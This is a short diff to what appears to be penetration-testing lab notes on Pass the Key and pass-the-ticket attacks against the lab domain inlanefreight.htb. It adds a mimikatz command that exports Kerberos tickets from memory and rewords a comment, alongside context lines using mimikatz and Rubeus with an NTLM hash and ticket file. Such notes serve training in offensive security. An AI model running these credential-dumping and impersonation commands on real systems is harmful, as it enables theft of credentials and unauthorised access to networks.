@@ -273,6 +273,8 @@ Pass the Key (also known as Overpass the Hash) is a post-exploitation technique 
 mimikatz.exe
 # get the key first
 sekurlsa::ekeys
+# dump tickets
+sekurlsa::tickets /export
 
 # attack
 sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
@@ -308,7 +310,7 @@ Rubeus.exe ptt /ticket:doIE1jCCB........
 ```powershell
 kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
 
-# can also use
+# run to use  cmd
 misc::cmd
 ```
 
